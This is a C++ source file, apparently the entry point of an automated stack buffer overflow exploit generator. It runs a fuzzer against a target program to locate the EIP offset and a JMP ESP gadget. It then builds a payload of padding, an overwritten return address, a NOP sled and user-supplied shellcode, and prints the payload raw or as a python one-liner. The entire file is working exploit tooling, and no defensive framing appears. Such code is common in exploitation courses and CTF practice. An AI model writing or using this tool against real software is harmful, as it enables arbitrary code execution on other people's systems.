#include <iostream>
#include <string>
#include "Log/Log.hpp"
#include "Stages/Fuzzer/Fuzzer.hpp"

void printHelp(char* application)
{
    std::cerr << application << " [verbose|exploit] payload application" << std::endl;
}

int main(int argc, char* argv[])
{
    // Show help message
    if (argc < 4)
    {
        printHelp(argv[0]);
        return 1;
    }

    std::string mode = std::string(argv[1]);
    if (mode == "verbose")
        Log::mode = LogMode::Verbose;
    else if (mode == "exploit")
        Log::mode = LogMode::Exploit;
    else
    {
        printHelp(argv[0]);
        return 2;
    }

    std::string shellFilepath = std::string(argv[2]);
    std::string application = std::string(argv[3]);

    // Run the fuzzer to find EIP
    if (!Fuzzer::run(application))
        return 3;

    // Read shell
    FILE* shellFile = fopen(shellFilepath.c_str(), "rb");
    fseek(shellFile, 0L, SEEK_END);
    long shellLength = ftell(shellFile);
    char* shell = (char*)malloc(shellLength);
    rewind(shellFile);
    fread(shell, shellLength, 1, shellFile);
    fclose(shellFile);

    uint32_t payloadLength = Fuzzer::getEipOffset() + 0x04/*EIP*/ + 0x20/*NOP*/ + shellLength/*Shell*/ + 1/*NULL Terminator*/;
    if (Fuzzer::getLength() > payloadLength)
        payloadLength = Fuzzer::getLength() + 1;

    char* payload = (char*)malloc(payloadLength);
    uint32_t offset = 0;

    // Padding
    for (offset = 0; offset < Fuzzer::getEipOffset(); offset++)
        payload[offset] = 'A';

    // EIP
    uint32_t esp = (uint32_t)Fuzzer::getJmpEsp();
    memcpy(payload + offset, &esp, 4);
    offset += 4;

    // NOP Sled
    uint32_t nopEnd = offset + 0x20;
    for (;offset < nopEnd; offset++)
        payload[offset] = '\x90';
    
    // Shell
    memcpy(payload + offset, shell, shellLength);
    offset += shellLength;

    // End Padding
    for (;offset < payloadLength; offset++)
        payload[offset] = '\x90';

    payload[payloadLength - 1] = '\0'; // NULL Terminator

    // Output python command
    if (Log::mode == LogMode::Verbose)
    {
        std::string python = "python -c 'print(\"";
        for (uint32_t i = 0; i < payloadLength - 1; i++)
        {
            char buffer[5];
            sprintf(buffer, "\\x%02x", (uint8_t)(payload[i]));
            python += std::string(buffer);
        }
        python += "\")'";
        Log::success("%s\n", python.c_str());
    }

    Log::exploit("%s", payload);
    return 0;
}
